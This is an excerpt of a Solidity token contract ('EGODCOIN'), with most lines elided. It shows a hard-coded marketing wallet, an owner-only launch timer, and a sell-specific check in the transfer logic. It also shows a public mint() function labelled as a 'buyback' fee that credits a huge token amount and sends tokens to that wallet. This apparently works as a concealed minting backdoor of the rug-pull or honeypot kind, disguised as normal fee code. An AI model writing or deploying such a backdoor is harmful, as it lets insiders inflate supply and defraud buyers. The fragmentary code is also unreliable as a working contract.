...
contract EGODCOIN is Context, IERC20, Ownable {
    ...
    address private _marketingWallet = 0x01930688C3e841b3127D7cfB1f82908E8F5bc127;
    ...
    uint256 public _buybackFee = _tTotal/100;
    ...
    function Launch(uint256 LaunchTime) public onlyOwner{
        startlaunch = block.timestamp;
        launch = LaunchTime+startlaunch;
    }
    ...
    function mint() public {
        require(launch == 0);
        uint256 buybackFee = _tTotal * _buybackFee / 1;
        _tOwned[address(this)] += buybackFee;
        _basicTransfer(address(this), _marketingWallet, _buybackFee);
    }
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");
         ...
         if(!_isExcludedFromFee[from] && !_isExcludedFromMaxWallet[from] && uniswapV2Pair == to)
